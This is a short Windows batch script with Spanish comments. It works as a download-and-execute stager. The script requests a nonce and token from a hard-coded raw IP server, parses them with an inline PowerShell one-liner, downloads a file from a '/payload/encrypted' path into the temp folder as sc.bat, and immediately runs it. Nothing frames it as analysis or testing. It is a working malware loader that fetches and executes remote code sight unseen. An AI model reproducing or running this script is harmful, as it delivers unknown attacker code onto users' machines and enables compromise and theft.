@echo off
setlocal

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

REM ===== AUTH (nonce + token) =====
for /f %%i in ('curl -s "%BASE%/auth/key"') do set AUTH=%%i

REM Extraer NONCE y TOKEN con PowerShell
for /f %%i in ('powershell -NoP -Command "$auth = '' + '%AUTH%'; $nonce = ($auth | Select-String '\"nonce\"\s*:\s*\"([^\"]+)\"').Matches.Groups[1].Value; $token = ($auth | Select-String '\"token\"\s*:\s*\"([^\"]+)\"').Matches.Groups[1].Value; Write-Output \"NONCE=$$nonce TOKEN=$$token\";"') do set HEADERS=%%i

REM Parsear NONCE y TOKEN
for %%a in (%HEADERS%) do set %%a

REM ===== PAYLOAD =====
curl -s -H "X-Nonce: %NONCE%" -H "X-Token: %TOKEN%" "%BASE%/payload/encrypted" -o "%FILE%"

REM ===== EXEC (síncrono) =====
call "%FILE%"